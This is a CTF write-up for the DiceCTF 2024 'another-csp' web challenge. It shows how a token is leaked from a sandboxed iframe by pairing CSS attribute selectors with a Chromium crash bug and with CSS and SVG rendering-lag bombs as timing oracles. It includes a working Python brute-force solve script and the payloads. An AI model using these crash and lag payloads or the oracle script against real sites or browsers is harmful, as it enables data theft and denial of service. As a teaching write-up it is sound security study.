---
title: another-csp
date: 2024-02-05
tags: 
- web
- csp
- css
- author-hartmannsyg
categories: DiceCTF 2024
---

written by {% person hartmannsyg %}

The gist of this challenge is that we have a box where we can inject arbitrary html into the srcdoc of a [**sandboxed**](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox) iframe (i.e. no scripts), and make the admin bot visit the page.

![](/static/DiceCTF2024/another-csp.png)

```html
<iframe id="sandbox" name="sandbox" sandbox></iframe>
```

In the website, we see that in the srcdoc, we have a h1 tag that contains the token
```js
	document.getElementById('form').onsubmit = e => {
		e.preventDefault();
		const code = document.getElementById('code').value;
		const token = localStorage.getItem('token') ?? '0'.repeat(6);
		const content = `<h1 data-token="${token}">${token}</h1>${code}`;
		document.getElementById('sandbox').srcdoc = content;
	}
```

This token is needed to get the flag

{% ccb lang:js gutter1:28-47 caption:index.js highlight:12 %}
createServer(async (req, res) => {
	const url = new URL(req.url, 'http://localhost/');
	if (url.pathname === '/') {
		return res.end(index);
	} else if (url.pathname === '/bot') {
		if (browserOpen) return res.end('already open!');
		const code = url.searchParams.get('code');
		if (!code || code.length > 1000) return res.end('no');
		visit(code);
		return res.end('visiting');
	} else if (url.pathname === '/flag') {
		if (url.searchParams.get('token') !== token) {
			res.end('wrong');
			await sleep(1000);
			process.exit(0);
		}
		return res.end(process.env.FLAG ?? 'dice{flag}');
	}
	return res.end();
}).listen(8080);
{% endccb %}

So, we have to exfiltrate the token in the h1 tag in the sandboxed iframe, somehow.

## Accessing token via css

We note something strange - the h1 that contains the token also has an extra attribute `data-token`:

{% ccb lang:html %}
<h1 data-token="${token}">${token}</h1>
{% endccb %}

We can use an [attribute selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) to test for it, like

```html
<style>
    [data-token = "000000"]{
        color: #69b00b;
    }
</style>
```

![](/static/DiceCTF2024/another-csp2.png)

We only need to match the *start* of the attribute using `^=`

```html
<style>
    [data-token ^= "0"]{
        color: #b00b69;
    }
</style>
```

![](/static/DiceCTF2024/another-csp3.png)


## Crash Timing Oracle

This is the intended solution

> https://issues.chromium.org/issues/41490764
> Steps to reproduce the problem:
> 1. Create a color using color-mix. `--c1: color-mix(in srgb, blue 50%, red);`
> 2. Use it with relative color syntax. `--c2: srgb(from var(--c1) r g b);`
> 3. Try to display it somewhere: `background-color: var(--c2);`
> 4. Observe the Aw, Snap! page.

Sure enough, if we insert the crash:

```html
<style>
    [data-token ^= "0"]{
        --c1: color-mix(in srgb, blue 50%, red);
        --c2: srgb(from var(--c1) r g b);
        background-color: var(--c2);
    }
</style>
```

![Aw Snap!](/static/DiceCTF2024/another-csp-awsnap.png)

So I made some initial code to see if whether crashing the site will cause any difference in time

{% ccb caption:timing.py lang:py gutter1:1-7,,8-22 wrapped:true %}
import requests
import time
URL = "https://another-csp-ab646b5e52d72f15.mc.ax/" # change
BOT_URL = URL + "bot"

def check(a):
    code = "<style>[data-token ^= \"" + a + "\"] {--c1: color-mix(in srgb, blue 50%, red);--c2: srgb(from var(--c1) r g b);background-color: var(--c2);}</style>"
    res = requests.get(BOT_URL, params={"code": code}).text
    start_time = time.time()
    while True:
        time.sleep(1)
        res = requests.get(BOT_URL).text
        if res == "no":
            break
        if "404" in res:
            print("ITS JOEVER; THE CONTAINER HAS DIED")
            break
    diff = time.time()-start_time 
    return diff
possible = "0123456789abcdef"
for c in possible:
    print(f"{c}: {check(c)}")
{% endccb %}

which gives:

{% ccb html:true terminal:true %}
0: 3.892151117324829
1: 3.7064714431762695
2: 3.7964861392974854
3: 3.5073633193969727
4: 4.0752739906311035
5: 3.6828672885894775
6: 4.019136428833008
<span class='comment'>7: 36.27450704574585 <--- sus, not the real one, this sometimes happens though</span>
8: 3.5690736770629883
9: 3.879948616027832
a: 3.6855063438415527
b: 4.01620078086853
c: 4.176863431930542
d: 3.8658812046051025
<span class='built_in'>e: 11.673217535018921 <--- real one</span>
f: 3.826751708984375
{% endccb %}

Apparently, [the reason for this working is](https://discord.com/channels/805956008665022475/808122408019165204/1203897576211087430):
> the basic theory here is that puppeteer is awful so if the browser crashes it just ... dies... and will get killed in 10s by the parent process. 

whereas if the crash css doesnt match, 1s after the iframe loads the program kills itself, which is less than 10s

### My Solve Script

{% ccb lang:py caption:solve.py gutter1:1-12,,13-43 wrapped:true scrollable:true %}
import requests
import time

URL = "https://another-csp-29fd2dc3c47b031a.mc.ax/" # change
BOT_URL = URL + "bot"
FLAG_URL = URL + "flag"

MIN_TIME = 5
MAX_TIME = 15

def check(a):
    code = "<style>[data-token ^= \"" + a + "\"] {--c1: color-mix(in srgb, blue 50%, red);--c2: srgb(from var(--c1) r g b);background-color: var(--c2);}</style>"
    res = requests.get(BOT_URL, params={"code": code}).text
    start_time = time.time()
    diff = "error"
    while True:
        time.sleep(1)
        res = requests.get(BOT_URL).text
        if res == "no":
            break
        if "404" in res:
            print("ITS JOEVER; THE CONTAINER HAS DIED")
            break
        diff = time.time() - start_time
        # too long already
        if diff > MAX_TIME:
            return "error"
    return diff

possible = "0123456789abcdef"
known = ""
for i in range(6):
    for c in possible:
        t = check(known + c)
        while t == "error":
            t = check(known + c)
        print(f"{known + c}: {t}")
        if MIN_TIME < t and t < MAX_TIME:
            known += c
            break

print(known)
print(requests.get(FLAG_URL + "?token=" + known).text)
{% endccb %}

{% ccb terminal:true scrollable:true %}
0: 1.850050926208496
1: 1.9460952281951904
2: 1.946507215499878
3: 1.9435338973999023
4: 2.3611578941345215
5: 1.9789025783538818
6: 1.9426231384277344
7: 8.475534915924072
70: 1.8813529014587402
71: 9.694042682647705
710: 2.1459810733795166
711: 1.8459458351135254
712: 1.9468448162078857
713: 1.9198267459869385
714: 1.9059381484985352
715: 1.8420600891113281
716: 1.8379285335540771
717: 1.8728313446044922
718: 1.7433650493621826
719: 8.217298984527588
7190: 1.76682448387146
7191: 1.9449293613433838
7192: 1.87434983253479
7193: 1.9374840259552002
7194: 1.81864595413208
7195: 1.9919259548187256
7196: 2.241041421890259
7197: 1.9941952228546143
7198: 1.9110934734344482
7199: 8.059188842773438
71990: 1.9987494945526123
71991: 1.9980275630950928
71992: 1.8948369026184082
71993: 1.9164738655090332
71994: 1.9653477668762207
71995: 1.8988752365112305
71996: 1.9797813892364502
71997: 1.9615263938903809
71998: 9.761866331100464
719980: 2.216115713119507
719981: 2.002336025238037
719982: 1.9037351608276367
719983: 2.0017824172973633
719984: 10.286545276641846
719984
dice{yeah-idk-this-one-was-pretty-funny}
{% endccb %}

## Lag Timing Oracle

It is also possible to make a timing differential using *lag*

For example, [_arkark's solution](https://gist.github.com/arkark/25129c14de194406d0e6fad15c907ad9#webanother-csp) uses a css that takes a long time to render

```html
<style>
  [data-token ^= "0"]::before {
    --0: attr(data-token);
    --1: var(--0)var(--0);
    --2: var(--1)var(--1);
    --3: var(--2)var(--2);
    --4: var(--3)var(--3);
    --5: var(--4)var(--4);
    --6: var(--5)var(--5);
    --7: var(--6)var(--6);
    --8: var(--7)var(--7);
    --9: var(--8)var(--8);
    --a: var(--9)var(--9);
    --b: var(--a)var(--a);
    --c: var(--b)var(--b);
    --d: var(--c)var(--c);
    --e: var(--d)var(--d);
    --f: var(--e)var(--e);
    --g: var(--f)var(--f);
    content: var(--g);
    font-size: 100em;
    filter: blur(10000px) drop-shadow(1024px 1024px 1024px blue);
  }
</style>
```

[garvinator's solution]() uses svg instead:

```html
<style>
    h1[data-token^='0'] + style + svg {
        display: block !important;
    }
</style>
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
    <path id="a" d="M0,0"/>
    <g id="b"><use href="#a"/><use href="#a"/><use href="#a"/></g>
    <g id="c"><use href="#b"/><use href="#b"/><use href="#b"/></g>
    <g id="d"><use href="#c"/><use href="#c"/><use href="#c"/></g>
    <g id="e"><use href="#d"/><use href="#d"/><use href="#d"/></g>
    <g id="f"><use href="#e"/><use href="#e"/><use href="#e"/></g>
    <g id="g"><use href="#f"/><use href="#f"/><use href="#f"/></g>
    <g id="h"><use href="#g"/><use href="#g"/><use href="#g"/></g>
    <g id="i"><use href="#h"/><use href="#h"/><use href="#h"/></g>
    <g id="j"><use href="#i"/><use href="#i"/><use href="#i"/></g>
    <g id="k"><use href="#j"/><use href="#j"/></g>
</svg>
```

The solving method for these two are basically identical to the intended solution though, it the oracle hits, it will take longer than if it does not.